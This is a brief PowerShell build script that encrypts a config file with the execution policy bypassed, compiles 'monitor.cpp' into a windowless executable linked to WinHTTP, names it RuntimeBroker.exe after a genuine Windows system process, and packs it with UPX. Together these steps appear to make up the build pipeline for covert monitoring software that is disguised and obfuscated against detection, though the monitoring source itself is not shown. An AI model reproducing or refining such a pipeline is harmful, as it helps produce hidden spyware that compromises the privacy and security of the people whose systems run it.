powershell -ExecutionPolicy Bypass -File encrypt_config.ps1
if (!$?) { Write-Output "Config encryption failed"; exit 1 }

windres version.rc -O coff -o version.res
if (!$?) { Write-Output "Resource compilation failed"; exit 1 }

g++ -Os -s -mwindows monitor.cpp version.res -lwinhttp -o RuntimeBroker.exe
if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }

Remove-Item -Force version.res -ErrorAction SilentlyContinue
upx --ultra-brute RuntimeBroker.exe
Write-Output "Build successful: RuntimeBroker.exe"
